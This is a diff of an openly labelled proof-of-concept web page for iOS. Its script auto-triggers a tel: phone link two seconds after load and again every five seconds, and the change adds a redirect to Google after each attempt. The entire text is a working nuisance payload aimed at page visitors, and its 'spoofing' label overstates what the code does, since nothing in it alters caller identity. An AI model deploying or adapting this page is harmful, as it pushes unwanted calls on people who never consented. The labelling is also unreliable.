@@ -33,7 +33,7 @@
 <body>
   <h2>PoC for Auto Phone Call Spoofing on iOS</h2>
 
-  <p>The page will automatically attempt to trigger a spoofed phone call.</p>
+  <p>The page will automatically attempt to trigger a spoofed phone call and redirect to Google.</p>
   
   <!-- This is optional, just for showing the status -->
   <button id="callButton">Trigger Call</button>
@@ -41,23 +41,36 @@
   <script>
     // Function to initiate the phone call
     function initiatePhoneCall() {
-      // The spoofed phone number (just an example)
       const spoofedPhoneNumber = "tel:+11234567890"; // Example phone number
-      window.location.href = spoofedPhoneNumber;
+      window.location.href = spoofedPhoneNumber; // This attempts to trigger the call
+    }
+
+    // Function to redirect to Google after a small delay
+    function redirectToGoogle() {
+      setTimeout(function() {
+        window.location.href = "https://www.google.com"; // Redirect to Google
+      }, 3000); // Delay to simulate time between phone bubble and redirect
     }
 
     // Automatically trigger the phone call after 2 seconds
     window.onload = function() {
-      setTimeout(initiatePhoneCall, 2000); // Initiate after 2 seconds
+      setTimeout(function() {
+        initiatePhoneCall();
+        redirectToGoogle();
+      }, 2000); // Trigger after 2 seconds
     };
 
     // For the button click (optional)
     document.getElementById('callButton').addEventListener('click', function() {
       initiatePhoneCall();
+      redirectToGoogle();
     });
 
     // Optional: Simulate taps or multiple calls if needed
-    setInterval(initiatePhoneCall, 5000); // This will try to trigger a call every 5 seconds
+    setInterval(function() {
+      initiatePhoneCall();
+      redirectToGoogle();
+    }, 5000); // Try to trigger a call every 5 seconds and redirect to Google
   </script>
 </body>
 </html>
